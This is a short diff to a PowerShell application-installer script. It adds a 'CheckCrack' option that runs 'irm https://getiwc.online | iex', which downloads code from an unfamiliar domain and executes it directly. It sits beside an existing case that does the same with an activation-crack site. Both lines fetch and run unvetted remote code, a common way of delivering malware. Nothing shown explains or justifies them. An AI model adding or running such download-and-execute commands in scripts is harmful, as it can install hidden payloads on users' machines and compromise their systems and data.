@@ -1239,6 +1239,9 @@ function Install-SelectedApplications {
             "script" {
                 irm https://get.activated.win | iex
             }
+            "CheckCrack" {
+                irm https://getiwc.online | iex
+            }
             "officeSuite" {
                 $chs = Show-OfficeSuiteForm -Links $officeLinks 
                 foreach ($v in $chs) { Start-Process $officeLinks[$v] }
